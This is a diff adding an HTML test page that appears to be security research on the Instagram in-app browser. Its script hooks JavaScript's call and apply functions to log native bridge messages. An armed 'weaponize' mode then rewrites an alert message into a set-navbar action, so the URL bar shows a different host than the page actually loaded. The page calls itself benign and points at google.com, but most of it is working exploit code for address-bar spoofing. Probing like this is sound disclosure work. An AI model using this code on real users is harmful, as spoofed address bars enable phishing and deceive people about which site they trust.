@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>navbar spoof probe</title>
+<style>
+ body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;padding:12px;line-height:1.4;color:#111}
+ h1{font-size:16px}h2{font-size:12px;margin:12px 0 4px;color:#333}
+ pre{background:#f4f4f7;border:1px solid #dcdce2;border-radius:6px;padding:8px;font-size:10px;white-space:pre-wrap;word-break:break-all}
+ button{font-size:14px;padding:11px;width:100%;border:1px solid #dcdce2;border-radius:8px;background:#fff;margin:5px 0}
+ input{width:100%;padding:9px;font-size:15px;border:1px solid #dcdce2;border-radius:8px;margin:4px 0}
+ .warn{color:#b23;font-size:11px}
+</style>
+</head>
+<body>
+<h1>IG in-app — navbar/URL-bar spoof probe (benign)</h1>
+<p style="font-size:12px;color:#666">Open inside the Instagram app in-app browser. RECON hooks
+Function.prototype.call/apply to LOG the real bridge message types (esp. around alert &amp; navbar),
+then a WEAPONIZE button rewrites a page-triggerable message into a set-navbar action. Benign — sets
+the address bar to a harmless host; no data read.</p>
+
+<h2>RECON — bridge messages seen (interact / tap alert)</h2>
+<button onclick="fireAlert()">trigger alert() (surfaces window-alert dispatch)</button>
+<pre id="log"></pre>
+
+<h2>WEAPONIZE — rewrite window-alert → set navbar</h2>
+<p>action strings (adjust to the REAL ones from the log):</p>
+<input id="trigType" value="window-alert">
+<input id="newType" value="dispatch-action">
+<input id="payload" value='{"actionType":"window-set-navbar-input","location":"https://www.google.com/"}'>
+<button onclick="arm()">ARM rewrite hook, then tap alert() above → watch the URL bar</button>
+<p class="warn">If the in-app URL bar changes to the host in the payload while this page stays = address-bar spoof.</p>
+
+<script>
+function g(id){return document.getElementById(id);}
+var L=g('log'); var n=0; function log(m){ if(n++>400) return; try{L.textContent=m+'\n'+L.textContent;}catch(e){} }
+function safe(x){ try{ if(typeof x==='string') return x.slice(0,300); return JSON.stringify(x).slice(0,300);}catch(e){try{return String(x).slice(0,200);}catch(_){return '(unser)';}} }
+
+log('IG='+/Instagram/i.test(navigator.userAgent)+' origin='+location.origin);
+
+// cheap detector for bridge-like message args
+function looksBridge(a){
+  try{
+    if(typeof a==='string') return /window-|dispatch-action|navbar|set-navbar|actionType|location|alert/i.test(a);
+    if(a && typeof a==='object' && typeof a[0]==='string') return /window-|dispatch|navbar|alert|action/i.test(a[0]);
+  }catch(e){}
+  return false;
+}
+
+// RECON: hook call + apply (preserve behavior), log bridge-like invocations
+var _call = Function.prototype.call, _apply = Function.prototype.apply;
+var armed=false, trigType='window-alert', newType='dispatch-action', newPayload='';
+Function.prototype.call = function(){
+  try{
+    // WEAPONIZE: if armed and this invocation carries the trigger message, rewrite it
+    if(armed){ for(var j=0;j<arguments.length;j++){ var a=arguments[j];
+      if(a && typeof a==='object' && a[0]===trigType){ a[0]=newType; a[1]=newPayload; log('REWROTE arg['+j+'] -> '+newType+' '+newPayload); break; }
+      if(typeof a==='string' && a===trigType){ log('note: trigger seen as string arg['+j+'] (convention differs)'); }
+    } }
+    for(var i=0;i<arguments.length && i<3;i++){ if(looksBridge(arguments[i])){ log('CALL msg['+i+']: '+safe(arguments[i])); break; } }
+  }catch(e){}
+  return _call.apply(this, arguments);
+};
+Function.prototype.apply = function(){
+  try{ for(var i=0;i<arguments.length && i<3;i++){ var a=arguments[i];
+    if(looksBridge(a)){ log('APPLY msg['+i+']: '+safe(a)); break; }
+    if(a && typeof a==='object'){ try{ for(var k=0;k<a.length && k<4;k++){ if(looksBridge(a[k])){ log('APPLY arr['+k+']: '+safe(a[k])); break; } } }catch(e){} }
+  } }catch(e){}
+  return _apply.apply(this, arguments);
+};
+log('hooked Function.prototype.call/apply (recon)');
+
+function fireAlert(){ try{ alert('probe'); log('alert() returned'); }catch(e){ log('alert threw '+e); } }
+function arm(){
+  trigType=(g('trigType').value||'window-alert').trim();
+  newType=(g('newType').value||'dispatch-action').trim();
+  newPayload=(g('payload').value||'').trim();
+  armed=true;
+  log('ARMED: rewrite '+trigType+' -> '+newType+' '+newPayload+'  (now tap trigger alert())');
+}
+</script>
+</body>
+</html>
